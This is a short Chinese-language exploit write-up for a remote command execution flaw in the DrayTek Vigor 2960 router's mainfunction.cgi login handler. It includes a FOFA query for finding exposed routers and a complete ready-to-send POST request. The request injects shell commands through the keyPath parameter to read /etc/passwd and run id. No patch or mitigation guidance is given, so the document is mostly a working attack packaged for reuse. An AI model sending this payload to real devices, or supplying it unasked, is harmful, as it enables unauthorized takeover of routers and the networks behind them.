# Draytek Vigor 2960 路由器mainfunction远程命令执行漏洞

# 一、漏洞简介
DrayTek是中国台湾的一家网络设备制造商，其产品包括VPN路由器、管理型交换机、无线AP和管理系统等，并被中小型企业广泛使用。DrayTek路由器系统存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限。

# 二、影响版本
+ Draytek Vigor 2960 路由器

# 三、资产测绘
+ fofa`title="Vigor 2960"`
+ 特征

![1712337973165-ab3cdc42-6e45-43c7-9fb9-932163c6c669.png](./img/N3A3GtuyXXzMteX0/1712337973165-ab3cdc42-6e45-43c7-9fb9-932163c6c669-423929.png)

# 四、漏洞复现
```plain
POST /cgi-bin/mainfunction.cgi HTTP/1.1
Host: 
Connection: close
Content-Length: 94
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
Content-Type: text/plain; charset=UTF-8
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6

action=login&keyPath=%27%0A%2fbin%2fcat${IFS}/etc/passwd%26id%0A%27&loginUser=a&loginPwd=a
```

![1712337999670-1deeeb58-a1eb-4b2f-b5c7-9d53ccbe7d17.png](./img/N3A3GtuyXXzMteX0/1712337999670-1deeeb58-a1eb-4b2f-b5c7-9d53ccbe7d17-818968.png)



> 更新: 2024-04-16 16:55:03  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lgi97gptaomg6blr>